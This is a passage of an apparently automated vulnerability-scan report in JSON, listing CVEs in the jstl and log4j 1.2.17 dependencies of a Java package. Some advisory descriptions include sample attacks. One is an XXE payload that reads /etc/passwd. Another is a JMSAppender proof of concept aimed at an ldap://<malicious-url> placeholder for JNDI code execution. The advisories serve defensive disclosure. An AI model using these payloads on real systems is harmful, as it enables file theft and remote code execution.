identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nThere is no fixed version for `javax.servlet:jstl`.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",
      "epssDetails": {
        "percentile": "0.92022",
        "probability": "0.05434",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2015-0254"
        ],
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-6x4w-8w53-xrvv"
        ]
      },
      "packageName": "javax.servlet:jstl",
      "proprietary": false,
      "creationTime": "2017-02-22T07:28:19.341000Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2015-02-27T16:13:27Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "javax.servlet",
        "artifactId": "jstl"
      },
      "publicationTime": "2015-02-27T16:51:55Z",
      "modificationTime": "2023-02-09T11:23:41.455575Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "javax.servlet:jstl@1.2"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "javax.servlet:jstl",
      "version": "1.2"
    },
    {
      "id": "snyk:lic:maven:javax.servlet:jstl:CDDL-1.0",
      "type": "license",
      "title": "CDDL-1.0 license",
      "semver": {
        "vulnerable": [
          "[1.2,)"
        ]
      },
      "license": "CDDL-1.0",
      "language": "java",
      "description": "CDDL-1.0 license",
      "packageName": "javax.servlet:jstl",
      "creationTime": "2023-06-14T10:47:12.309Z",
      "packageManager": "maven",
      "publicationTime": "2023-06-14T10:47:12.309Z",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "javax.servlet:jstl@1.2"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "javax.servlet:jstl",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-LOG4J-1300176",
      "title": "Man-in-the-Middle (MitM)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "low",
      "cvssScore": 3.7,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/LOG4J2-2819",
          "title": "Jira Issue"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 3.7,
          "modificationTime": "2022-05-13T01:10:59.793871Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 3.7,
          "modificationTime": "2022-10-25T22:25:05.921273Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
      "epssDetails": {
        "percentile": "0.60788",
        "probability": "0.00231",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-9488"
        ],
        "CWE": [
          "CWE-297"
        ],
        "GHSA": [
          "GHSA-vwqq-5vrc-xw9h"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2021-06-04T15:38:41.700520Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-04-27T17:16:14Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2020-04-28T17:16:14Z",
      "modificationTime": "2023-09-28T10:28:56.484981Z",
      "socialTrendAlert": false,
      "severityWithCritical": "low",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2316893",
      "title": "Arbitrary Code Execution",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.6,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx",
          "title": "Apache Mail"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301",
          "title": "GitHub Comment"
        },
        {
          "url": "https://github.com/apache/logging-log4j2/pull/608",
          "title": "GitHub Discussion"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 6.4,
          "modificationTime": "2022-05-03T21:14:50.879880Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-11-27T21:15:02.884557Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-10-06T01:10:27.666341Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. <br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
      "epssDetails": {
        "percentile": "0.98358",
        "probability": "0.89218",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2021-4104"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2021-12-13T14:52:40.887231Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2021-12-10T00:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2021-12-13T15:31:00Z",
      "modificationTime": "2023-09-28T10:34:57.544358Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2342645",
      "title": "SQL Injection",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://logging.apache.org/log4j/1.2/index.html",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-07-26T01:11:24.708151Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "modificationTime": "2022-05-11T11:31:53.940580Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-11-27T21:23:50.447464Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
      "epssDetails": {
        "percentile": "0.71874",
        "probability": "0.00443",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23305"
        ],
        "CWE": [
          "CWE-89"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2022-01-18T17:06:29.378900Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-18T17:01:37Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2022-01-18T17:13:25Z",
      "modificationTime": "2023-09-28T10:30:34.953517Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2342646",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://logging.apache.org/log4j/1.2/index.html",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-07-26T01:11:23.442829Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "modificationTime": "2022-05-11T11:32:04.853481Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-11-27T21:23:46.897083Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
      "epssDetails": {
        "percentile": "0.79566",
        "probability": "0.00797",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23307"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2022-01-18T17:08:37.955423Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-18T17:06:32Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2022-01-18T17:13:25Z",
      "modificationTime": "2023-09-28T10:37:55.904293Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2342647",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://logging.apache.org/log4j/1.2/index.html",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-07-26T01:11:25.323210Z"
        },
        {
          "assigner": "SUSE",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 6.6,
          "modificationTime": "2022-05-11T11:31:14.452251Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-11-27T21:20:50.584044Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
      "epssDetails": {
        "percentile": "0.79473",
        "probability": "0.00790",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23302"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2022-01-18T17:25:51.891230Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-18T17:22:50Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2022-01-18T17:28:19Z",
      "modificationTime": "2023-09-28T10:31:47.894637Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-LOG4J-3358774",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Garrett Tucker of Red Hat"
      ],
      "semver": {
        "vulnerable": [
          "[1.0.4,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.9,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t",
          "title": "Apache Lists"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-16T01:10:11.157125Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-30T13:31:03.696549Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). When using the `Chainsaw` or `SocketAppender` components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted, deeply nested `hashmap` or `hashtable` (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve denial of service when the object is deserialized. \r\n\r\nThis issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x `org.apache.logging.log4j/log4j-core`.  \r\n\r\n*NOTE:* This vulnerability only affects products that are no longer supported by the maintainer.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Lists](https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t)\n",
      "epssDetails": {
        "percentile": "0.37094",
        "probability": "0.00089",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-26464"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-vp98-w2p3-mv35"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2023-03-11T13:18:05.378536Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-03-10T15:30:43Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2023-03-11T13:18:05.600249Z",
      "modificationTime": "2023-09-28T09:38:02.694904Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-LOG4J-572732",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Marcio Almeida de Macedo"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "critical",
